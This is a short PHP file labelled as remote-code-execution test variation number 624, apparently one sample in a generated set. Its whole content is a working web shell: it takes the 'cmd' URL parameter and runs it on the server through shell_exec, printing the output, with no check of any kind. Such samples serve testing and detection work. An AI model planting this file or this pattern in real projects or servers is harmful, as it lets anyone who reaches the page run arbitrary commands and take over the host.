<?php
// RCE test variation #624
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>